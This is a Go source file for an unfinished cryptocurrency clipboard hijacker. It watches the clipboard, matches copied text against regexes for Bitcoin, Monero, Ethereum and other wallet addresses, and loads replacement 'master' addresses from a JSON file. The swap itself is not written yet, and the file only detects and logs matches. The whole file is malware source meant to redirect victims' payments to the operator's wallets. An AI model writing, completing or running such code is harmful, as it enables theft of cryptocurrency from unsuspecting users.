package main

import (
	"context"
	"encoding/json"
	"io/ioutil"
	"log"
	"regexp"

	"golang.design/x/clipboard"
)

type MasterAdresses struct {
	BtcAddress  string `json:"btc"`
	XmrAddress  string `json:"xmr"`
	EthAddress  string `json:"eth"`
	DashAddress string `json:"dash"`
	XrpAddress  string `json:"xrp"`
	DogeAddress string `json:"doge"`
	TronAddress string `json:"tron"`
}

type RegexMatches struct {
	CryptoName string `json:"crypto"`
	RegexMatch string `json:"regexMatch"`
}

var regexMatches = loadRegexMatches()

func main() {
	err := clipboard.Init()

	if err != nil {
		log.Fatalf("unable to init clipboard, %s", err.Error())
	}

	ch := clipboard.Watch(context.TODO(), clipboard.FmtText)

	// TODO, fix up regex_matches to make them work
	for data := range ch {
		log.Printf("data:%s", string(data))
		replaceClipboard(string(data))
		log.Println("-------------")
	}

}

func loadAdresses() MasterAdresses {
	file, err := ioutil.ReadFile("./addresses.json")

	if err != nil {
		log.Fatalf("unable to open addresses.json, %s", err.Error())
	}

	var masterAdresses MasterAdresses
	err = json.Unmarshal(file, &masterAdresses)

	if err != nil {
		log.Fatalf("unable to unmarshal addresses.json, %s", err.Error())
	}

	return masterAdresses
}

// TODO, load json into a map so then we are able to loop over all the regex matches,
// and check against curent user clipboard
func loadRegexMatches() []RegexMatches {
	file, err := ioutil.ReadFile("./regex_match.json")

	if err != nil {
		log.Fatalf("unable to open regex_match.json, %s", err.Error())
	}

	var regexMatches []RegexMatches

	err = json.Unmarshal(file, &regexMatches)

	if err != nil {
		log.Fatalf("unable to unmarshal regex_match.json, %s", err.Error())
	}

	return regexMatches
}

func replaceClipboard(userClipboard string) (foundCrypto string, err error) {
	for i := range regexMatches {
		compiledRegex, err := regexp.Compile(regexMatches[i].RegexMatch)

		if err != nil {
			log.Panicf("unable to compile regex %s,", err.Error())
			return "", err
		}

		if compiledRegex.MatchString(userClipboard) {
			log.Printf("matched crypto: %s ", regexMatches[i].CryptoName)
			return regexMatches[i].CryptoName, nil
		}
	}
	log.Printf("Found no crypto in clipboard")
	return "", nil
}
